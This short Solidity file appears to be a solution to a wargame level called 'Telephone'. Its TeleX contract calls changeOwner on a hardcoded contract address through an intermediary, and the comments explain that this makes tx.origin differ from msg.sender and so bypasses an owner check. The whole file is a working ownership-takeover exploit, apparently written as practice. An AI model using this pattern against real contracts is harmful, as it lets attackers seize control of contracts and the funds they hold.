// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

// as tx.origin is the address that initiates the tx, means the broadcaster
// and the msg.sender is the address that call the function.
// here the msg.sender is the contract address and tx.origin is EOA
contract TeleX {
    Telephone internal phone =
        Telephone(0x0E3d6417ECE909b53b9d76ECB10d592b94a3e003);

    function change(address owner) public {
        phone.changeOwner(owner);
    }
}
